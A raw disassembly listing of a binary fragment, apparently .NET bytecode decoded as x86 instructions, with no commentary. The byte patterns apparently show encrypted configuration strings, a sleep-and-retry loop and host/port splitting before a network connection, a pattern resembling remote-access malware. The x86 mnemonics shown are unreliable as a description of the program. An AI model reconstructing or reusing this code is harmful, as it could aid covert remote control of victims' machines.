  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	12 01                	adc    (%ecx),%al
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	ed                   	in     (%dx),%eax
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	a0 02 00 70 80       	mov    0x80700002,%al
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	53                   	push   %ebx
  4028f6:	03 00                	add    (%eax),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	67 03 00             	add    (%bx,%si),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	7b 03                	jnp    0x40290e
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	d5 03                	aad    $0x3
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	88 04 00             	mov    %al,(%eax,%eax,1)
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	8b 16                	mov    (%esi),%edx
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	3e 1e                	ds push %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	f1                   	int1
  40293c:	1e                   	push   %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402946:	1f                   	pop    %ds
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	57                   	push   %edi
  402956:	20 00                	and    %al,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	5b                   	pop    %ebx
  402960:	20 00                	and    %al,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	0e                   	push   %cs
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 18 21 00       	add    $0x211872,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	18 21                	sbb    %ah,(%ecx)
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 1a 21    	add    %esp,0x211a7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
